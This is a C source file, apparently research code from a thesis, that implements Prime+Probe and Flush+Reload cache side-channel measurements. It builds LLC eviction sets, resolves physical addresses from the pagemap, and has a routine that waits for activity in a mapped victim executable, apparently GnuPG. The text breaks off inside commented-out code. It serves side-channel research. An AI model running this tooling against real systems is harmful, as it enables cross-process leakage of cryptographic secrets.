#define _GNU_SOURCE
#include <math.h>
#include <stdio.h>

#include <limits.h>
#include "../../Utils/src/cachetechniques.h"
#include "../../Utils/src/fileutils.h"
#include "../../Utils/src/performancecounters.h"

#define PAGES_SIZE 4096
#define PAGEMAP_INFO_SIZE 8 /*There are 64 bits of info for each page on the pagemap*/
#define CACHE_NR_OF_BITS_OF_OFFSET 6
#define CACHE_LINE_NUMBER_OF_BYTES 64
#define MAX_TIMES_TO_CSV 10000 /*BEFORE WAS 300000*/
#define PRIME_ANALYSIS_DATA_FILENAME "/home/root/thesis-code/prime_static_analysis.data"
#define PROBE_ANALYSIS_DATA_FILENAME "/home/root/thesis-code/probe_static_analysis.data"
#define MAX_TIMES_TO_OBTAIN_THRESHOLD 512*1024
#define VARIATION_ANALYSIS_DATA_FILENAME "pp_llc_hit_miss_variation_static_analysis.data"
#define VARIATION_ANALYSIS_DATA_DIRECTORY "/home/root/thesis-code/"
#define SCAN_CACHE_DATA_DIRECTORY "/home/root/thesis-code/scan/"
#define RANDOMIZESETPTRS 0
#define HAVE_MAXRUNS_TO_EVALUATE_HITS 1

#define handle_error(msg) \
	do { perror(msg); exit(EXIT_FAILURE); } while (0)

void *getphysicaladdr(void *virtualaddr, int pagemap) {
	// Access a cache line
	accessway(virtualaddr);

	// Obtain virtual addr offset within the pagemap
	// Data from: https://www.kernel.org/doc/Documentation/vm/pagemap.txt
	// Page map info is 64 bit size = 8 bytes = PAGEMAP_INFO_SIZE
	unsigned long virtualaddr_offset =
			((unsigned long) virtualaddr / PAGES_SIZE) * PAGEMAP_INFO_SIZE;

	// Data from: https://www.kernel.org/doc/Documentation/vm/pagemap.txt
	// The page frame number is in bits 0-54.
	// PAGEMAP_INFO_SIZE -1 = the first 7 bytes (bits 0-55)
	unsigned long long pageframenumber = 0;
	if (pread(pagemap, &pageframenumber, PAGEMAP_INFO_SIZE, virtualaddr_offset)
			!= 8) {
		/*NOT 8bytes*/
		handle_error("pread");
	}

	// Check page present
	if (!(pageframenumber & (1ULL << 63))) {
		handle_error("page not present");
	}

	// Data from: https://www.kernel.org/doc/Documentation/vm/pagemap.txt
	// Bit 55 is the flag pte is soft-dirty so it need to be cleared
	pageframenumber &= ((1ULL << 54) - 1);

	// Calculate the physical addr:  "| PageFramNumber | Offset of the physical addr |"
	// The offset of the physical address is = "| Index | Offset |" of the virtual addr
	return ((pageframenumber * PAGES_SIZE)
			| (((unsigned long) virtualaddr) & (PAGES_SIZE - 1)));
}

unsigned int getsetindex(void *physicaladdr, int numberofsets, int bitsofoffset) {
	return (((unsigned int) physicaladdr) >> bitsofoffset) % numberofsets;
}

/* [+] BEGIN [+] Least Recently Used Replacement Policy <- No need to this type of attack */

typedef struct llcache {
	void *basepointer;
	int mappedsize;
	int pagemap;
	int numberofsets;
	int numberofways;
	int linesize;
	int bitsofoffset;
	unsigned short *randomized;
	int randomizedsets;
	unsigned int *analysis;
} cache_t;
/*
 void * testset2 = BASE_CACHE_LINE_PTR((*llcache)->basepointer, set, way);
 void *physicaladdr2 = getphysicaladdr(testset2 , (*llcache)->pagemap);
 unsigned int set2 = getsetindex(physicaladdr2);
 void * testset3 = BASE_CACHE_LINE_PTR((*llcache)->basepointer, set, way+1);
 void *physicaladdr3 = getphysicaladdr(testset3 , (*llcache)->pagemap);
 unsigned int set3 = getsetindex(physicaladdr3);
 printf("SET2: %d | SET3: %d | WAY: %d\n",set2,set3,way);*/
typedef struct evictiondata {
	unsigned int maxhit;
	unsigned int maxmiss;
	int threshold;
	double countcorrecthits;
	double allhits;
	double hitsrate;
	double countcorrectmisses;
	double allmisses;
	double evictionrate;
	unsigned int *hit_counts;
	unsigned int *miss_counts;
} evictiondata_t;

void* getbasecachelineptr(cache_t *cache, int set, int way) {
	return (void *) (((unsigned int) cache->basepointer)
			+ ((set) * CACHE_LINE_NUMBER_OF_BYTES)
			+ ((way) * (cache->numberofsets * cache->linesize)));
}

void* getprevcachelineptr(cache_t *cache, int set, int way) {
	return (void *) (((unsigned int) cache->basepointer)
			+ ((set) * CACHE_LINE_NUMBER_OF_BYTES)
			+ ((way) * (cache->numberofsets * cache->linesize))
			+ (sizeof(void *)));
}

// Prepare and Prime LLC
void preparecache(cache_t **cache, int mappedsize, int numberofsets,
		int numberofways, int linesize, int bitsofoffset) {
	int set, way;

	*cache = calloc(1, sizeof(cache_t));

	// Get file pointer for /proc/<pid>/pagemap
	(*cache)->pagemap = open("/proc/self/pagemap", O_RDONLY);

	// Map ll cache
	(*cache)->basepointer = mmap(0, mappedsize,
	PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if ((*cache)->basepointer == MAP_FAILED)
		handle_error("mmap");

	(*cache)->mappedsize = mappedsize;
	(*cache)->numberofsets = numberofsets;
	(*cache)->numberofways = numberofways;
	(*cache)->linesize = linesize;
	(*cache)->bitsofoffset = bitsofoffset;
	(*cache)->randomized = calloc(numberofsets, sizeof(unsigned short));
	(*cache)->analysis = calloc(MAX_TIMES_TO_CSV * numberofsets,
			sizeof(unsigned short int));

	// Prepare mapping/linked list
	for (set = 0; set < numberofsets; ++set) {
		for (way = 0; way < numberofways - 1; way++) {
			// (set,way)->nextline = &(set,way+1)
			(*(void **) (getbasecachelineptr((*cache), set, way))) =
					getbasecachelineptr((*cache), set, way + 1);
			// (set,way+1)->previousline = &(set,way)
			(*(void **) (getprevcachelineptr((*cache), set, way + 1))) =
					getprevcachelineptr((*cache), set, way);
		}
		if (!RANDOMIZESETPTRS && set < numberofsets - 1) {
			// (set,LL_CACHE_NUMBER_OF_WAYS-1)->nextline = &(set+1,0);
			(*(void **) (getbasecachelineptr((*cache), set, numberofways - 1))) =
					getbasecachelineptr((*cache), set + 1, 0);
			// (set,0)->previousline = &(set+1,LL_CACHE_NUMBER_OF_WAYS-1);
			(*(void **) (getprevcachelineptr((*cache), set, 0))) =
					getprevcachelineptr((*cache), set + 1, numberofways - 1);
		}
	}
	if (!RANDOMIZESETPTRS) {
		// (LL_CACHE_NUMBER_OF_SETS-1,LL_CACHE_NUMBER_OF_WAYS-1)->nextline = &(0,0)
		(*(void **) (getbasecachelineptr((*cache), numberofsets - 1,
				numberofways - 1))) = getbasecachelineptr((*cache), 0, 0);
		// (LL_CACHE_NUMBER_OF_SETS-1,0)->previousline = &(0,LL_CACHE_NUMBER_OF_WAYS-1)
		(*(void **) (getprevcachelineptr((*cache), numberofsets - 1, 0))) =
				getprevcachelineptr((*cache), 0, numberofways - 1);
	}
	if (RANDOMIZESETPTRS) {
		//Init randomization auxiliar list
		for (set = 0; set < numberofsets; ++set) {
			(*cache)->randomized[set] = set;
		}
		(*cache)->randomizedsets = numberofsets;
		//Perform randomization
		for (set = 0; set < (*cache)->randomizedsets; ++set) {
			int randset = random() % ((*cache)->randomizedsets - set) + set;
			unsigned short aux = (*cache)->randomized[randset];
			(*cache)->randomized[randset] = (*cache)->randomized[set];
			(*cache)->randomized[set] = aux;
		}
		//Build list randomized dependencies
		for (set = 0; set < (*cache)->randomizedsets - 1; ++set) {
			// (set,LL_CACHE_NUMBER_OF_WAYS-1)->nextline = &(set+1,0);
			(*(void **) (getbasecachelineptr((*cache),
					(*cache)->randomized[set], numberofways - 1))) =
					getbasecachelineptr((*cache), (*cache)->randomized[set + 1],
							0);
			// (set,0)->previousline = &(set+1,LL_CACHE_NUMBER_OF_WAYS-1);
			(*(void **) (getprevcachelineptr((*cache),
					(*cache)->randomized[set], 0))) = getprevcachelineptr(
					(*cache), (*cache)->randomized[set + 1], numberofways - 1);
		}
		// (LL_CACHE_NUMBER_OF_SETS-1,LL_CACHE_NUMBER_OF_WAYS-1)->nextline = &(0,0)
		(*(void **) (getbasecachelineptr((*cache),
				(*cache)->randomized[numberofsets - 1], numberofways - 1))) =
				getbasecachelineptr((*cache), (*cache)->randomized[0], 0);
		// (LL_CACHE_NUMBER_OF_SETS-1,0)->previousline = &(0,LL_CACHE_NUMBER_OF_WAYS-1)
		(*(void **) (getprevcachelineptr((*cache),
				(*cache)->randomized[numberofsets - 1], 0))) =
				getprevcachelineptr((*cache), (*cache)->randomized[0],
						numberofways - 1);
	}
}

void disposecache(cache_t *llcache) {
	if (llcache->basepointer != NULL) {
		munmap(llcache->basepointer, llcache->mappedsize);
	}

	llcache->mappedsize = 0;
	llcache->basepointer = NULL;

	free(llcache);
}

unsigned int prime1set1wayinthemiddle(cache_t *cache, int set) {
	int way = cache->numberofways/2;
	unsigned int setcycles = 0;
	void *setpointer;
	if (RANDOMIZESETPTRS)
		setpointer = getbasecachelineptr(cache, cache->randomized[set], 0);
	else
		setpointer = getbasecachelineptr(cache, set, 0);
	while (way--) {
		//printf("PRIMEWAY 64B: %x\n", setpointer);

//		//Transverse the pointer here
//		printf("PRIME POINTER: %x\n",setpointer);
		setpointer = (*(void **) setpointer);
	}
	setcycles += timeaccessway(setpointer);
	return setcycles;
}

unsigned int prime(cache_t *cache, int set) {
	int way = cache->numberofways;
	unsigned int setcycles = 0;
	void *setpointer;
	if (RANDOMIZESETPTRS)
		setpointer = getbasecachelineptr(cache, cache->randomized[set], 0);
	else
		setpointer = getbasecachelineptr(cache, set, 0);
	while (way--) {
		//printf("PRIMEWAY 64B: %x\n", setpointer);
		setcycles += timeaccessway(setpointer);
//		//Transverse the pointer here
//		printf("PRIME POINTER: %x\n",setpointer);
		setpointer = (*(void **) setpointer);
	}
	return setcycles;
}

unsigned int probe(cache_t *cache, int set) {
	int way = cache->numberofways;
	unsigned int setcycles = 0;
	void *setpointer;
	if (RANDOMIZESETPTRS)
		setpointer = getprevcachelineptr(cache, cache->randomized[set],
				cache->numberofways - 1);
	else
		setpointer = getprevcachelineptr(cache, set, cache->numberofways - 1);
	while (way--) {
		//printf("PROBEWAY 64B: %x\n", setpointer);
		setcycles += timeaccessway(setpointer);
//		printf("PROBE POINTER: %x\n",setpointer);
		//Transverse the pointer here
		setpointer = (*(void **) setpointer);
	}
	return setcycles;
}

void analysellcache(unsigned short int *out_analysis, void * llbaseptr,
		int numberofsets, int numberofways) {
	int set, way;
	for (set = 0; set < numberofsets; ++set) {
		way = numberofways;
//		printf("--------------------------\n");
//		printf("SET 64B*6Ways: %x\n",llbaseptr);

//*out_analysis = reloadset(llbaseptr, );
		unsigned long setcycles = 0;
		while (way--) {
//			printf("WAY 64B: %x\n",llbaseptr);
			setcycles += timeaccessway(llbaseptr);
			//Transverse the pointer here
			llbaseptr = (*(void **) llbaseptr);
		}

//		if(out_analysis != NULL){
//			*out_analysis = aux < USHRT_MAX? aux : USHRT_MAX;
//
//		printf("AFTER RELOAD SET 64B*6Ways: %X\n",llbaseptr);
//		printf("Analysed UINT: %X\n",out_analysis);
//		printf("--------------------------\n");
//			out_analysis++;
//		}
	}
}

/* [+] END [+] Least Recently Used Replacement Policy <- No need to this type of attack */

void obtainevictiondata(int histogramsize, int histogramscale, int maxruns,
		evictiondata_t *evictiondata, cache_t *cache) {

	// Preparing histograms
	const int MID_ARRAY = PAGES_SIZE / 2;
	evictiondata->hit_counts = calloc(histogramsize, sizeof(unsigned int));
	evictiondata->miss_counts = calloc(histogramsize, sizeof(unsigned int));

	int i;
	void *array, *physicaladdr;

	array = mmap(0, PAGES_SIZE, PROT_READ | PROT_WRITE,
	MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (array == MAP_FAILED)
		handle_error("mmap");

	physicaladdr = getphysicaladdr(array + MID_ARRAY, cache->pagemap);
	unsigned int set = getsetindex(physicaladdr, cache->numberofsets,
			cache->bitsofoffset);

	//Obtain the same set as the array
//	unsigned int set1, set2,way;
//	void * ptr;
//	if (RANDOMIZESETPTRS)
//		ptr = getbasecachelineptr(cache, cache->randomized[0], 0);
//	else
//		ptr = getbasecachelineptr(cache, 0, 0);
////
//		for (set1 = 0; set1 < cache->numberofsets; ++set1) {
//			for (way = 0; way < cache->numberofways; ++way){
//			physicaladdr = getphysicaladdr(ptr, cache->pagemap);
//			set2 = getsetindex(physicaladdr, cache->numberofsets,
//					cache->bitsofoffset);
//			//if(set1==0)
//
//			if(!RANDOMIZESETPTRS)
//				printf(
//						"CYCLE SET1: %d || SET FROM VA: %d || PTR: %x || PHYSICAL ADDR: %x \n",
//						set1, set2, ptr, physicaladdr);
//			else
//				printf(
//						"CYCLE SET1: %d || SET FROM VA: %d || PTR: %x || PHYSICAL ADDR: %x \n",
//						cache->randomized[set1], set2, ptr, physicaladdr);
////			if (set == set2) {
////				break;
////			}
//			ptr = (*(void **) ptr);
//		}
//		if (set == set2) {
//			break;
//		}
//	}

	// Preparing for the hit histogram
	accessway(array + MID_ARRAY);

	set = 512;
	// Hit histogram
	for (i = 0; i < maxruns; ++i) {
		prime(cache, set);
		unsigned int probetime = probe(cache, set) / histogramscale;
		evictiondata->hit_counts[
				probetime > (histogramsize - 1) ? histogramsize - 1 : probetime]++;
		sched_yield();
	}

	// Preparing for the miss histogram
	flush(array + MID_ARRAY);

	// Miss histogram
	for (i = 0; i < maxruns; ++i) {
		prime(cache, set);

		accessway(array + MID_ARRAY);

		unsigned int probetime = probe(cache, set) / histogramscale;
		evictiondata->miss_counts[
				probetime > (histogramsize - 1) ? histogramsize - 1 : probetime]++;
		sched_yield();
	}

	// Obtain eviciton data
	unsigned int hitmax = 0;
	unsigned int missmax = 0;
	unsigned int hitmaxindex = 0;
	unsigned int missmaxindex = 0;
	unsigned int missminindex = 0;
//	printf("TSC:           HITS           MISSES\n");
	for (i = 0; i < histogramsize; ++i) {
//		printf("%3d: %10zu %10zu\n", i * histogramscale, hit_counts[i],
//				miss_counts[i]);
		if (hitmax < evictiondata->hit_counts[i]) {
			hitmax = evictiondata->hit_counts[i];
			hitmaxindex = i;
		}
		if (missmax < evictiondata->miss_counts[i]) {
			missmax = evictiondata->miss_counts[i];
			missmaxindex = i;
		}
		if (evictiondata->miss_counts[i] > 3 && missminindex == 0)
			missminindex = i;
	}

	double countcorrectmisses = 0, allmisses = 0, countcorrecthits = 0,
			allhits = 0;

	evictiondata->maxhit = hitmaxindex * histogramscale;
	evictiondata->maxmiss = missmaxindex * histogramscale;
	evictiondata->threshold = evictiondata->maxmiss
			- (evictiondata->maxmiss - evictiondata->maxhit) / 2;

	for (i = 0; i < histogramsize; ++i) {
		if (evictiondata->miss_counts[i] > 0
				&& (i * histogramscale) > evictiondata->threshold) {
			++countcorrectmisses;
		}
		if (evictiondata->miss_counts[i] > 0) {
			++allmisses;
		}
		if (evictiondata->hit_counts[i] > 0
				&& (i * histogramscale) < evictiondata->threshold) {
			++countcorrecthits;
		}
		if (evictiondata->hit_counts[i] > 0) {
			++allhits;
		}
	}
	evictiondata->allhits = allhits;
	evictiondata->allmisses = allmisses;
	evictiondata->countcorrecthits = countcorrecthits;
	evictiondata->countcorrectmisses = countcorrectmisses;
	evictiondata->evictionrate = (countcorrectmisses / allmisses) * 100;
	evictiondata->hitsrate = (countcorrecthits / allhits) * 100;

	//Dispose array mmap
	munmap(array, PAGES_SIZE);
}

void analysehitandmissvariation(int mappedsize, int numberofsets,
		int numberofways, int linesize, int bitsofoffset, char *filename,
		int analysissize, int histogramsize, int histogramscale) {
	evictiondata_t *evictiondata = calloc(1, sizeof(evictiondata_t));

	const int headerssize = 2;
	int i;
	unsigned int analysis_array[analysissize][headerssize];

	cache_t *cache;

	preparecache(&cache, mappedsize, numberofsets, numberofways, linesize,
			bitsofoffset);

	for (i = 0; i < analysissize; ++i) {
		printf("Analyzing... %d\n", i);
		obtainevictiondata(/*Histogram size*/histogramsize, /*Histogram scale*/
		histogramscale,
		MAX_TIMES_TO_OBTAIN_THRESHOLD, evictiondata, cache);
		analysis_array[i][0] = evictiondata->maxhit;
		analysis_array[i][1] = evictiondata->maxmiss;
	}
	const char *headers[headerssize];
	headers[0] = "Hits";
	headers[1] = "Misses";
	biarraytocsvwithstrheaders(filename, headers, analysissize, headerssize,
			analysis_array);
	disposecache(cache);
}

/*WAIT VICTIM ACTIVITY WITH FLUSH+RELOAD*/
#include <sys/stat.h>
#define THRESHOLD 45
#define GPG_MAX_SIZE_BYTES 4194304
#define OUTPUTRAWDATA 1
#define DELAYFORVICTIMACTIVITY 2800
#define NUMBER_OF_EXE_ADDRS 3
#define MAX_ADDRS_TO_MONITOR 10
#define MAX_TIMES_TO_MONITOR_EACH_ADDRS 300000

typedef struct waitforvictim {
	int nr_addrs;
	char* mapping_addr;
	unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][NUMBER_OF_EXE_ADDRS];
	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
} waitforvictim_t;

void preparewaitforactivity(waitforvictim_t **waitforvictim) {
//	*llcache = calloc(1, sizeof(llcache_t));
//		(*llcache)->mappedsize = mappedsize;
	*waitforvictim = calloc(1, sizeof(waitforvictim_t));

	int fd_exe;
	struct stat sbuff;

	//obtain the addrs to monitor
	(*waitforvictim)->nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME,
			(*waitforvictim)->exe_addrs);
	if ((*waitforvictim)->nr_addrs != NUMBER_OF_EXE_ADDRS) {
		handle_error("NUMBER OF EXE ADDRS ERROR");
	}

	//share the executable
	fd_exe = open(EXE_FILENAME, O_RDONLY);
	if (fd_exe == -1)
		handle_error("open_exe_filename");
	if (fstat(fd_exe, &sbuff) == -1)
		handle_error("fstat");
	(*waitforvictim)->mapping_addr = (char*) mmap(0, GPG_MAX_SIZE_BYTES,
	PROT_READ, MAP_PRIVATE, fd_exe, 0);
	if ((*waitforvictim)->mapping_addr == MAP_FAILED)
		handle_error("mmap");
	printf(".exe shared\n");
}

void waitforvictimactivity(waitforvictim_t *waitforvictim) {

	unsigned long ptr_offset = (unsigned long) waitforvictim->mapping_addr;

	unsigned long long start = getcurrenttsc();
	fr_analysealladdrs(OUTPUTRAWDATA, waitforvictim->analysis_array[0],
			ptr_offset, waitforvictim->exe_addrs, NUMBER_OF_EXE_ADDRS,
			THRESHOLD);
	do {
		do {
			start += DELAYFORVICTIMACTIVITY;
		} while (missedvictimactivity(start));
		fr_analysealladdrs(OUTPUTRAWDATA, waitforvictim->analysis_array[0],
				ptr_offset, waitforvictim->exe_addrs, waitforvictim->nr_addrs,
				THRESHOLD);
	} while (!isvictimactive(waitforvictim->analysis_array[0],
			waitforvictim->nr_addrs,
			OUTPUTRAWDATA ? THRESHOLD : 2));
}
/*WAIT VICTIM ACTIVITY WITH FLUSH+RELOAD*/

void analysellc(int cyclestartidx, int cycleincrement, int set, cache_t *cache, int maxruns) {
	int i;

	for (i = cyclestartidx; i < maxruns; i += cycleincrement) {

		//Prime
		prime(cache, set);

		//Probe
		cache->analysis[i] = probe(cache, set);
	}
}

void generatehistogram(char *prefix, int numberofsets, int numberofways,
		int cachelinesize, int timesmappedsize, int bitsofoffset,
		int histogramscale, int histogramsize) {
	cache_t *cache;
	int mappedsize = numberofsets * numberofways * cachelinesize
			* timesmappedsize;
	evictiondata_t *evictiondata = calloc(1, sizeof(evictiondata_t));

	preparecache(&cache, mappedsize, numberofsets, numberofways, cachelinesize,
			bitsofoffset);
	obtainevictiondata(histogramsize, histogramscale,/*maxruns*/
	MAX_TIMES_TO_OBTAIN_THRESHOLD, evictiondata, cache);

	char *dirwithprefix = concat(VARIATION_ANALYSIS_DATA_DIRECTORY, prefix);
	char *dstfilename = concat(dirwithprefix, "_prime_probe_histogram.data");
	twoarraystocsvwithstrheaders(dstfilename, "Prime+Probe(Hit)",
			"Prime+Access+Probe(Miss)", histogramscale, histogramsize,
			evictiondata->hit_counts, evictiondata->miss_counts);
	disposecache(cache);
}

int hitevaluation(int numberofsets, int numberofways, int cachelinesize, int bitsofoffset, int timesmappedsize, unsigned int *analysis, int startanalysisidx) {
	int i, analysisidx;
	cache_t *cache;
	int mappedsize = numberofsets * numberofways * cachelinesize
				* timesmappedsize;
	preparecache(&cache, mappedsize, numberofsets, numberofways, cachelinesize,
			bitsofoffset);


//	int auxanalysis;
	for (i = 0, analysisidx = startanalysisidx; i < numberofsets;
			++i, ++analysisidx) {
		prime(cache,i);
		analysis[analysisidx] = probe(cache,i);
	}
	return analysisidx + 1;

	//Dispose array mmap
	//munmap(basepointer, size);
}

int missevaluation(int numberofsets, int numberofways, int cachelinesize, int bitsofoffset, int timesmappedsize, unsigned int *analysis, int startanalysisidx) {
	int i, analysisidx;
	cache_t *cache, *testvictim;
	int mappedsize = numberofsets * numberofways * cachelinesize
				* timesmappedsize;
	preparecache(&cache, mappedsize, numberofsets, numberofways, cachelinesize,
			bitsofoffset);
	preparecache(&testvictim, mappedsize, numberofsets, numberofways, cachelinesize,
				bitsofoffset);

	//victimsetpointer = getbasecachelineptr(testvictim, i, numberofways/2);
	for (i = 0, analysisidx = startanalysisidx; i < numberofsets;
			++i, ++analysisidx) {

		prime(cache,i);

		//VERY GOOD WITH ONE WAY
		prime1set1wayinthemiddle(testvictim,i);
		//VERYGOOD BUT ALL WAYS prime(testvictim,i);
		analysis[analysisidx] = probe(cache,i);
	}
	return analysisidx + 1;

	//Dispose array mmap
	//munmap(basepointer, size);
}

//Test L1,LLC and RAM cycles of hits
void evaluate_l1_llc_ram_with_prime_probe() {
	int l1nrsets = 64;
	int l1nrways = 6;
	int bytescacheline = 64;
	int bitsofoffset = 6;
	unsigned int l1size = l1nrsets * l1nrways * bytescacheline;
	int llcnrsets = 1024;
	int llcnrways = 16;
	unsigned int llcsize = llcnrsets * llcnrways * bytescacheline;
	unsigned int ramsize = llcsize * 2;
	unsigned int evaluationsize = l1nrsets + llcnrsets + llcnrsets*2;
	unsigned int *evaluation = mmap(0, evaluationsize * sizeof(unsigned int),
	PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	const char * dstfilename = concat(VARIATION_ANALYSIS_DATA_DIRECTORY,
			"l1_llc_ram_prime+probe_evaluation.data");
	int analysedsize = 0;
	analysedsize = hitevaluation(l1nrsets,l1nrways,bytescacheline,bitsofoffset,1,evaluation, analysedsize);
	analysedsize = hitevaluation(llcnrsets,llcnrways,bytescacheline,bitsofoffset,1, evaluation, analysedsize);
	analysedsize = hitevaluation(llcnrsets*2,llcnrways*2,bytescacheline,bitsofoffset,1, evaluation, analysedsize);

	arraytocsv(dstfilename, 1, analysedsize, evaluation);
}

//Test L1,LLC and RAM cycles of misses
void evaluate_l1_llc_ram_with_prime_access_probe() {
	int l1nrsets = 64;
	int l1nrways = 6;
	int bytescacheline = 64;
	int bitsofoffset = 6;
	unsigned int l1size = l1nrsets * l1nrways * bytescacheline;
	int llcnrsets = 1024;
	int llcnrways = 16;
	unsigned int llcsize = llcnrsets * llcnrways * bytescacheline;
	unsigned int ramsize = llcsize * 2;
	unsigned int evaluationsize = l1nrsets + llcnrsets + llcnrsets*2;
	unsigned int *evaluation = mmap(0, evaluationsize * sizeof(unsigned int),
	PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	const char * dstfilename = concat(VARIATION_ANALYSIS_DATA_DIRECTORY,
			"l1_llc_ram_prime+access+probe_evaluation.data");
	int analysedsize = 0;
	analysedsize = missevaluation(l1nrsets,l1nrways,bytescacheline,bitsofoffset,1,evaluation, analysedsize);
	analysedsize = missevaluation(llcnrsets,llcnrways,bytescacheline,bitsofoffset,1, evaluation, analysedsize);
	analysedsize = missevaluation(llcnrsets*2,llcnrways*2,bytescacheline,bitsofoffset,1, evaluation, analysedsize);

	arraytocsv(dstfilename, 1,analysedsize, evaluation);
}

//To generate the mean graphs
float mean(const unsigned int *data, const int size){
	int i,sum = 0.0;
	for(i=0; i < size;++i){
		sum += data[i];
	}
	return sum/size;
}

float standarddeviation(const float mean, const unsigned int *data, const int size){
	int i;
	float dev,var,sdev = 0.0;
	for(i=0; i < size;++i){
		dev = (data[i] - mean) * (data[i] - mean);
		sdev += dev;
	}
	var = sdev / (size - 1);
	sdev = sqrt(var);
	return sdev;
}

float coefficientvariation(float sdev,float mean){
	return (sdev/mean)*100;
}

int TWO_hitevaluation(int numberofsets, int numberofways, int cachelinesize, int bitsofoffset, int timesmappedsize, int maxruns, unsigned int *analysis, int startanalysisidx) {
	int i, j, analysisidx;

	cache_t *cache;
	void *basepointer;
	int size = numberofsets * numberofways * cachelinesize
				* timesmappedsize;
	preparecache(&cache, size, numberofsets, numberofways, cachelinesize,
			bitsofoffset);

	basepointer = getbasecachelineptr(cache, 0, 0);
	int ways;

	//Init to populate pages
//	for (i = 0; i < numberofsets; i += 1) {
//		ways = numberofways;
//		while(ways--){
//			unsigned long long *aux = ((void *) basepointer);
//			//aux[3] = i;
//			basepointer = (*(void **) basepointer);
//		}
//	}


#if HAVE_MAXRUNS_TO_EVALUATE_HITS == 0
	for (i = 0, analysisidx = startanalysisidx; i < numberofsets;
			i += 1) {
		ways = numberofways;
		while(ways){
			analysis[analysisidx] = timeaccessway(((void *) basepointer));
			basepointer = (*(void **) basepointer);
			analysis[analysisidx+1] = timeaccessway(((void *) basepointer));
			basepointer = (*(void **) basepointer);
			analysis[analysisidx+2] = timeaccessway(((void *) basepointer));
			basepointer = (*(void **) basepointer);
			analysisidx += 3;
			ways-=3;
		}
	}
#endif

#if HAVE_MAXRUNS_TO_EVALUATE_HITS == 1
	void *auxptr1, *auxptr2, *auxptr3;
	//printf("%X\n",basepointer);
	for (i = 0, analysisidx = startanalysisidx; i < numberofsets;
			i += 1) {
		ways = numberofways;
		while(ways){
			auxptr1 = basepointer;
			printf("%X",basepointer);
			auxptr2 = (*(void **) basepointer);
			printf("%X",basepointer);
			auxptr3 = (*(void **) basepointer);
			printf("%X",basepointer);
			for(j = 0; j < maxruns; ++j){
				analysis[analysisidx] += timeaccessway(auxptr1);
				analysis[analysisidx+1] += timeaccessway(auxptr2);
				analysis[analysisidx+2] += timeaccessway(auxptr3);
			}
			analysis[analysisidx] /= maxruns;
			analysis[analysisidx+1] /= maxruns;
			analysis[analysisidx+2] /= maxruns;

			basepointer = auxptr3;
			analysisidx += 3;
			ways -=3;
		}
	}
#endif
	return analysisidx-3;

	//Dispose array mmap
	//munmap(basepointer, size);
}

//Test L1,LLC and RAM cycles of hits
void TWO_evaluate_l1_llc_ram() {
	// 6 WAYS | 64 SETS | 64 BYTES(cacheline)
	unsigned int l1size = 6 * 64 * 64;
	// 16 WAYS | 1024 SETS | 64 BYTES(cacheline)
	unsigned int llcsize = 16 * 1024 * 64;
	// 2 x LLC SIZE
	unsigned int ramsize = (16*2) * (1024*2) * 64;
	// Size of evaluation array(where the cycles will be stores)
	unsigned int evaluationsize = l1size + llcsize + ramsize;
	// Allocate evaluation array(where the cycles will be stores)
	unsigned int *evaluation = mmap(0, evaluationsize * sizeof(unsigned int),
	PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	// File name
	const char * dstfilename = concat(VARIATION_ANALYSIS_DATA_DIRECTORY,
			"l1_llc_ram_evaluation.data");

	int analysedsize = 0;
	int increment = 64;
	int maxruns = 10000;

	// Obtain cycles for the L1C
	//analysedsize = TWO_hitevaluation(/*numberofsets*/64,/*numberofways*/6,/*cachelinesize*/64,/*bitsofoffset*/6,/*timesmappedsize*/1, maxruns, evaluation, analysedsize);
	// Obtain cycles for the LLC
	//analysedsize = TWO_hitevaluation(/*numberofsets*/1024,/*numberofways*/16,/*cachelinesize*/64,/*bitsofoffset*/6,/*timesmappedsize*/1, maxruns, evaluation, analysedsize);
	// Obtain cycles for the 2xLLC
	analysedsize = TWO_hitevaluation(/*numberofsets*/1024,/*numberofways*/26,/*cachelinesize*/64,/*bitsofoffset*/6,/*timesmappedsize*/1, maxruns, evaluation, analysedsize);

	// Generate the file to be used by gnuplot
	arraytocsv(dstfilename, increment, analysedsize, evaluation);
}

int main() {

	setcoreaffinity(0);

	//Evaluate Hits
	TWO_evaluate_l1_llc_ram();

	//Evaluate Prime+Probe
	//evaluate_l1_llc_ram_with_prime_probe();

	//Evaluate Prime+Access+Probe
	//evaluate_l1_llc_ram_with_prime_access_probe();

	//Generate histograms
//	generatehistogram("LLC", /*numberofsets*/1024,
//	/*numberofways*/16, /*cachelinesize*/64, /*timesmappedsize*/1, /*bitsofoffset*/
//	6, /*histogramscale*/
//	5, /*histogramsize*/300);

//	generatehistogram("L1", /*numberofsets*/64,
//	/*numberofways*/6, /*cachelinesize*/64, /*timesmappedsize*/1,/*bitsofoffset*/6, /*histogramscale*/
//			5, /*histogramsize*/
//			300);

	//SCAN SETS
//	cache_t *cache;
//	evictiondata_t *evictiondata;
//	int mappedsize, maxruns;
////
////	const int histogramsize = 300;
////	const int histogramscale = 5;
////
//	const int numberofsets = 1024;
//	const int numberofways = 16;
//	const int cachelinesize = 64;
//	const int bitsofoffset = 6;
//
//	// Paper Cache-access pattern attack on disaligned AES t-tables
//	// (3/4)^(4*3) = 1.367% probability LLC not being totally evicted
//	mappedsize = numberofsets * numberofways * cachelinesize;
//
//	maxruns = 5000;
//	evictiondata = calloc(1, sizeof(evictiondata_t));
//
//	waitforvictim_t *waitforvictim;
//	int setidx;
//
//	preparecache(&cache, mappedsize, numberofsets, numberofways, cachelinesize,
//			bitsofoffset);
//	preparewaitforactivity(&waitforvictim);
//
//	//For N files
//	const int cyclestartidx = 0;
//	const int cycleincrement = 1;
//	char *nfilename;
//	float *means = calloc(numberofsets, sizeof(float));
//	float *standarddeviations = calloc(numberofsets, sizeof(float));
//	float *coefficientevariations = calloc(numberofsets, sizeof(float));
//	for (setidx = 0; setidx < numberofsets; ++setidx) {
//		printf("\nWaiting for activity...\n");
//
//		waitforvictimactivity(waitforvictim);
//
//		//int setidx = 1;
//		printf("Analyse set number: %d\n", setidx);
//		//For 1 file
